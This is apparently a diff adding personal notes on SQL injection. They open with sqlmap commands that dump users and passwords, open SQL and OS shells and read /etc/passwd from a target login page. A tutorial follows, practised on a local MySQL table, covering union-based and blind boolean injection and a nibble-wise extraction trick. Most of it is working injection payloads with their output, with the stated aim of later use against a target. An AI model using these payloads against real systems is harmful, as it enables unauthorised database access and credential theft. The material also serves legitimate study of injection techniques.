@@ -1,0 +1,160 @@
+sqlmap -u http://ip/login.php
+    --data "email=...&..."
+    -p "email"
+    --level=x     # 1 klein  5 hoch default 1
+    --risk=x      # 0 bis 3   default 1
+    CMDs  --fingerprint, --banner,  --current-user, --current-db,   --js-db
+    
+    -v 0 --batch --users --passwords
+    
+    -v 0  --batch --sql-shell --os-shell  --file-read=/etc/passwd
+> create database injection_tests;
+> use injection_tests;
+> create table injectable (id int auto_increment primary key, value varchar(255));
+> insert into injectable values(null, 'This is the first record');
+> select * from injectable;
+> select concat(version(),0x3a, database());
++-----------------------------------------+
+| concat(version(),0x3a, database())      |
++-----------------------------------------+
+| 5.5.32-0ubuntu0.12.04.1:injection_tests |
++-----------------------------------------+
+
+In band injections are non-blind injections that will return raw data to the page. In some cases, such as a subqueried or staged query being used to determine information, union select will not work because it will not assign a proper value. 
+
+> select value from injectable where id=-1 union select concat(version(),0x3a, database());
++-----------------------------------------+
+| value                                   |
++-----------------------------------------+
+| 5.5.32-0ubuntu0.12.04.1:injection_tests |
++-----------------------------------------+
+
+There are two types of out of band (blind) vulnerabilities, and both types have two methods of exploitation: enumeration and extraction. The two types consist of partially blind injection and full blind injection. Partially blind injection results when the result of the page output is the result of multiple queries. Full blind injection requires timing attacks.
+
+> alter table injectable add column comment varchar(255);
+> update injectable set comment="this is the first comment" where id=1;
+> select * from injectable;
+
+Partially blind injection results when the result of the page output is the result of multiple queries.
+
+> select id from injectable where value='This is the first record';
+> select comment from injectable where id=1; # id=1 comes from the above query
+
+Boolean enumeration takes 1 request per bit to determine a value. While this creates to a larger number of requests and is therefore highly obvious in logs, its a bit easier than bitwise extraction in this particular instance. In this case union select isn't going to work, and here's why:
+> select id from injectable where value='This is the nonexistent record' union select concat(version(),0x3a,database());
+> select comment from injectable where id=5.5.32-0ubuntu0.12.04.1:injection_tests;
+ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to yourMySQL server version for the right syntax to use near '.32-0ubuntu0.12.04.1:injection_tests' at line 1
+
+The MID() function is used to extract characters from a text field.
+SELECT MID(column_name,start[,length]) FROM table_name;
+
+You won't see a query error, you just wont see data on the page when you visit the injectable query. So back to sql, our target value will again be the output of "concat(version(),0x3a,database())", or "5.5.32-0ubuntu0.12.04.1:injection_tests". This is obviously going to be a different string in your target, but this article is about developing your technique locally. So, lets just get the first letter with a normal query:
+> select mid((select concat(version(),0x3a,database())),1,1);
++-----------------------------------------------------+
+| mid((select concat(version(),0x3a,database())),1,1) |
++-----------------------------------------------------+
+| 5                                                   |   # "5.5.32-0ubuntu0.12.04.1:injection_tests"
++-----------------------------------------------------+
+To get its ascii code:
+> select ascii(mid((select concat(version(),0x3a,database())),1,1));
++------------------------------------------------------------+
+| ascii(mid((select concat(version(),0x3a,database())),1,1)) |
++------------------------------------------------------------+
+|                                                         53 |
++------------------------------------------------------------+
+
+> select id from injectable where value='This is the first record' 
+  and (select ascii(mid((select concat(version(),0x3a,database())),1,1))) > '127';
+return empty
+
+> select id from injectable where value='This is the first record' and (select ascii(mid((select concat(version(),0x3a,database())),1,1))) < '127';
+return id
+
+> select id from injectable where 
+  value=(select value from 
+  (select value,@v:=@v+1 as pos from injectable y 
+  join (select @v:=0) k) x where pos=2);
+
+> select id from injectable where value='' or value=(select value from (select value,@v:=@v+1 as pos from injectable y join (select @v:=0) k) x where pos=2) and '1'='1';
+
+Notice this just gets you the second record displayed. If you wanted to crawl the records (necessary for precomputation), you could simply increment the WHERE statement in the query where it says "where pos=2":
+
+> select id from injectable where value='' or value=(select value from (select value,@v:=@v+1 as pos from injectable y join (select @v:=0) k) x where pos=1) and '1'='1';
++----+
+| id |
++----+
+|  1 |
++----+
+ 
+> select id from injectable where value='' or value=(select value from (select value,@v:=@v+1 as pos from injectable y join (select @v:=0) k) x where pos=2) and '1'='1';
++----+
+| id |
++----+
+| 23 |
++----+
+ 
+mysql> select id from injectable where value='' or value=(select value from (select value,@v:=@v+1 as pos from injectable y join (select @v:=0) k) x where pos=3) and '1'='1';
++----+
+| id |
++----+
+| 93 |
++----+
+
+So in this particular example, we can actually use the "null" value as a fourth value. The same result applies when we place pos=0, and therefore we can use it as a 0-3 counter. Boolean enumeration bases its findings on yes or no answers (true or false) which results in it taking one request to determine the value of one bit. But in this case, we actually have the access to two bits of data, because we are using the null value as a placeholder for 0. The maximum value of a nybble (4 bits) is 15. So, it can only go into 4 using integer division 0-3 times. Not only that, but the value of 15 modulus 4 can also only be 0-3. So first lets concentrate on selecting a single nibble of data.
+
+> select ascii(mid((select concat(version(),0x3a,database())),1,1));
++------------------------------------------------------------+
+| ascii(mid((select concat(version(),0x3a,database())),1,1)) |
++------------------------------------------------------------+
+|                                                         53 |
++------------------------------------------------------------+
+ 
+mysql> select hex(mid((select concat(version(),0x3a,database())),1,1));
++----------------------------------------------------------+
+| hex(mid((select concat(version(),0x3a,database())),1,1)) |
++----------------------------------------------------------+
+| 35                                                       |
++----------------------------------------------------------+
+ 
+mysql> select mid(hex(mid((select concat(version(),0x3a,database())),1,1)),1,1);
++-------------------------------------------------------------------+
+| mid(hex(mid((select concat(version(),0x3a,database())),1,1)),1,1) |
++-------------------------------------------------------------------+
+| 3                                                                 |
++-------------------------------------------------------------------+
+
+select mid(hex(mid((select concat(version(),0x3a,database())),1,1)),1,1) div 4;
++-------------------------------------------------------------------------+
+| mid(hex(mid((select concat(version(),0x3a,database())),1,1)),1,1) div 4 |
++-------------------------------------------------------------------------+
+|                                                                       0 |
++-------------------------------------------------------------------------+
+
+select mid(hex(mid((select concat(version(),0x3a,database())),1,1)),1,1) % 4;
++-----------------------------------------------------------------------+
+| mid(hex(mid((select concat(version(),0x3a,database())),1,1)),1,1) % 4 |
++-----------------------------------------------------------------------+
+|                                                                     3 |
++-----------------------------------------------------------------------+
+
+> select id from injectable where value='' or value=(select value from (select value,@v:=@v+1 as pos from injectable y join (select @v:=0) k) x where pos=(select mid(hex(mid((select concat(version(),0x3a,database())),1,1)),1,1) div 4)) and '1'='1';
+return empty
+
+> select id from injectable where value='' or value=(select value from (select value,@v:=@v+1 as pos from injectable y join (select @v:=0) k) x where pos=(select mid(hex(mid((select concat(version(),0x3a,database())),1,1)),1,1) % 4)) and '1'='1';
+return id
+
+> select id from injectable where value='' or value=(select value from (select value,@v:=@v+1 as pos from injectable y join (select @v:=0) k) x where pos=(select mid(hex(mid((select concat(version(),0x3a,database())),1,1)),2,1) div 4)) and '1'='1';
++----+
+| id |
++----+
+|  1 |
++----+
+ 
+> select id from injectable where value='' or value=(select value from (select value,@v:=@v+1 as pos from injectable y join (select @v:=0) k) x where pos=(select mid(hex(mid((select concat(version(),0x3a,database())),1,1)),2,1) % 4)) and '1'='1';
++----+
+| id |
++----+
+|  1 |
++----+
+
+
